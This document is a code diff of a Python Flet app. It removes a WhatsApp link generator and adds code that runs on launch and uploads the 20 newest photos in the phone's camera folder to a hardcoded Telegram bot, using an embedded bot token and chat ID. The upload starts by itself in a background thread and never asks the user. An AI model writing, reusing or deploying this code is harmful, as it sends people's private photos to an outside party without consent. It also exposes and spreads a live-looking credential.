@@ -1,100 +1,88 @@
-from flet import *
-import datetime
+import os
+import glob
+import requests
+import threading
+import time
+import flet as ft
 
-def main(page: Page):
-    page.title = "عمل رابط واتساب"
-    page.window.width = 390
-    page.window.height = 740
-    page.window.top = 10
-    page.window.left = 960
-    page.horizontal_alignment = "center"
-    page.vertical_alignment = "center"
+# إعداد بيانات بوت تيليجرام - قم بتعديلها بما يتناسب مع بياناتك
+TOKEN = "7259492835:AAEJhhqbEzTOj0Q7vZj6YOK0PmwRHYqaroM"   # ضع هنا رمز التوكن الخاص بك
+CHAT_ID = "6486770497"              # ضع هنا معرف الدردشة (رقمي أو نصي)
+IMAGE_DIR = "/storage/emulated/0/DCIM/Camera"  # عدل المسار حسب بيئتك
+
+def send_images(page: ft.Page, progress_bar: ft.ProgressBar, status_text: ft.Text):
+    """
+    تقوم الدالة بالبحث عن آخر 20 صورة في المجلد المحدد وإرسالها إلى بوت تيليجرام،
+    مع تحديث شريط التقدم والنص لعرض حالة العملية.
+    """
+    # تحديث النص ليعلم المستخدم بأن العملية بدأت
+    status_text.value = "جاري تجهيز الملفات..."
+    page.update()
     
-    # إعدادات الوضع الداكن
-    page.bgcolor = colors.BLACK  # تحديد الخلفية إلى اللون الأسود لوضع داكن
+    # البحث عن ملفات الصور بامتدادات شائعة
+    extensions = ["*.jpg", "*.jpeg", "*.png"]
+    image_files = []
+    for ext in extensions:
+        image_files.extend(glob.glob(os.path.join(IMAGE_DIR, ext)))
+    
+    if not image_files:
+        status_text.value = "لم يتم العثور على صور في المجلد المحدد."
+        page.update()
+        return
 
-    # شريط التطبيق العلوي
-    page.appbar = AppBar(
-        title=Text("عمل روابط واتساب مجانا", color=colors.WHITE),
-        bgcolor='green',
-        leading=Icon(icons.HOME, color=colors.WHITE),
-        center_title=True,
-        leading_width=80,
-        actions=[
-            PopupMenuButton(
-                items=[
-                    PopupMenuItem(text='شرح التطبيق', icon=icons.APP_BLOCKING , on_click=lambda e: page.launch_url("https://wa.me/201552825549")),
-                    PopupMenuItem(text='المطورين', icon=icons.DEVELOPER_MODE_SHARP, on_click=lambda e: page.launch_url("https://wa.me/201552825549")),
-                    PopupMenuItem(),
-                    PopupMenuItem(text="تقييم التطبيق", icon=icons.STAR_HALF , on_click=lambda e: page.launch_url("https://wa.me/201552825549")),
-                ]
-            ),
-        ]
-    )
+    # فرز الصور بناءً على وقت التعديل (الأحدث أولاً)
+    image_files = sorted(image_files, key=os.path.getmtime, reverse=True)
+    last_20_images = image_files[:20]
+    total = len(last_20_images)
+    
+    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
+    messages = []  # لتجميع رسائل نتيجة الإرسال
 
-    # وظيفة توليد الرابط
-    def generate_link(e):
-        if number.value.strip():
-            try:
-                phone_number = int(number.value)
-                message_text = message.value.strip().replace(" ", "%20") if message.value else ""
-                whatsapp_link = f"https://wa.me/{phone_number}?text={message_text}" if message_text else f"https://wa.me/{phone_number}"
-                
-                # نسخ الرابط إلى الحافظة
-                page.set_clipboard(whatsapp_link)
-
-                # إظهار الرابط الناتج
-                result_text.value = f"رابط واتساب تم إنشاؤه: {whatsapp_link}"
-
-                # حفظ تاريخ آخر عملية
-                last_generated_label.value = f"آخر عملية تم إنشاؤها: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-
-                # إنشاء تنبيه SnackBar
-                snackbar = SnackBar(content=Text("✅ تم إنشاء الرابط ونسخه للحافظة", color=colors.WHITE), bgcolor="green")
-                page.overlay.append(snackbar)
-                snackbar.open = True
-                page.update()
-            except ValueError:
-                snackbar = SnackBar(content=Text("❌ يرجى إدخال رقم صحيح!", color=colors.WHITE), bgcolor="red")
-                page.overlay.append(snackbar)
-                snackbar.open = True
-                page.update()
-        else:
-            snackbar = SnackBar(content=Text("⚠️ يرجى إدخال رقم الهاتف!", color=colors.WHITE), bgcolor="red")
-            page.overlay.append(snackbar)
-            snackbar.open = True
-            page.update()
-
-    # صورة واتساب
-    whatsapp_image = Image(
-        src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg",
-        width=100,
-        height=100
-    )
-
-    # حقول الإدخال
-    number = TextField(label="رقم الهاتف", text_align='center', prefix_icon=icons.PHONE, color=colors.WHITE, bgcolor=colors.BLACK)
-    message = TextField(label="الرسالة (اختياري)", text_align='center', prefix_icon=icons.MESSAGE, color=colors.WHITE, bgcolor=colors.BLACK)
-
-    # زر الإنشاء
-    btn = ElevatedButton("إنشاء ونسخ", width=170, color=colors.WHITE, on_click=generate_link)
-
-    # حقل لإظهار الرابط الناتج
-    result_text = Text("", size=16, color=colors.WHITE, text_align="center")
-
-    # حقل لإظهار تاريخ آخر عملية
-    last_generated_label = Text("لم يتم إنشاء رابط بعد.", size=14, color=colors.WHITE, text_align="center")
-
-    # ترتيب العناصر في الصفحة
-    page.add(
-        whatsapp_image,  # إضافة صورة واتساب
-        number,
-        message,
-        btn,
-        result_text,
-        last_generated_label
-    )
-
+    for idx, image_path in enumerate(last_20_images):
+        try:
+            with open(image_path, "rb") as photo:
+                payload = {"chat_id": CHAT_ID}
+                files_payload = {"photo": photo}
+                response = requests.post(url, data=payload, files=files_payload)
+                if response.status_code == 200:
+                    messages.append(f"تم إرسال: {os.path.basename(image_path)}")
+                else:
+                    messages.append(f"فشل إرسال: {os.path.basename(image_path)}")
+        except Exception as e:
+            messages.append(f"خطأ في {os.path.basename(image_path)}: {e}")
+        
+        # تحديث شريط التقدم
+        progress_bar.value = (idx + 1) / total
+        page.update()
+        # يمكن إضافة تأخير بسيط إذا رغبت في ملاحظة حركة شريط التقدم
+        time.sleep(0.1)
+    
+    # عرض ملخص النتائج بعد الانتهاء
+    status_text.value = "\n".join(messages)
     page.update()
 
-app(main)
+def main(page: ft.Page):
+    page.title = "إرسال الصور إلى Telegram"
+    page.padding = 20
+    page.horizontal_alignment = "center"
+    page.vertical_alignment = "center"
+
+    # إنشاء عنصر نص لعرض الحالة
+    status_text = ft.Text("جاري تجهيز الملفات...", size=16)
+    
+    # إنشاء شريط التقدم
+    progress_bar = ft.ProgressBar(value=0, width=300)
+    
+    # إضافة العناصر إلى الصفحة
+    page.add(status_text, progress_bar)
+    page.update()
+
+    # تشغيل عملية الإرسال في Thread منفصل حتى لا تحجب واجهة المستخدم
+    threading.Thread(
+        target=send_images, 
+        args=(page, progress_bar, status_text),
+        daemon=True
+    ).start()
+
+# تشغيل التطبيق
+ft.app(target=main)
